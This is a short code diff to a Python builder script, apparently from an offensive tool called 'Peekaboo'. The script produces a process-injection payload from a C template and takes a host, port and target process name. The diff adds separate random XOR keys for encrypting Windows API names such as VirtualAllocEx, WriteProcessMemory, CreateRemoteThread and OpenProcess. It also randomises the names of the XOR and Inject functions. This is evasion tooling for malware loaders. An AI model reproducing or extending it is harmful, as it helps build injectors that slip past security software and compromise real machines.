@@ -21,7 +21,6 @@ class Colors:
 class PeekabooEncryptor():
     def __init__(self):
         self.XOR_PAYLOAD = self.random()
-        self.XOR_FUNC = self.random()
         self.XOR_PROC = self.random()
         self.XOR_DLL = self.random()
 
@@ -29,7 +28,7 @@ class PeekabooEncryptor():
         return self.XOR_PAYLOAD
 
     def func_key(self):
-        return self.XOR_FUNC
+        return self.random()
 
     def proc_key(self):
         return self.XOR_PROC
@@ -139,7 +138,14 @@ def run_peekaboo(host, port, proc_name, mode):
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
-    data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
+    data = data.replace('char s_vaex_key[] = "";', 'char s_vaex_key[] = "' + vaex_key + '";')
+    data = data.replace('char s_wpm_key[] = "";', 'char s_wpm_key[] = "' + wpm_key + '";')
+    data = data.replace('char s_cth_key[] = "";', 'char s_cth_key[] = "' + ct_key + '";')
+    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
+    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
+    data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
+    data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
+    data = data.replace('char s_op_key[] = "";', 'char s_op_key[] = "' + op_key + '";')
     data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
     data = data.replace('XOR(', f_xor + "(")
     data = data.replace("Inject(", f_inj + "(")
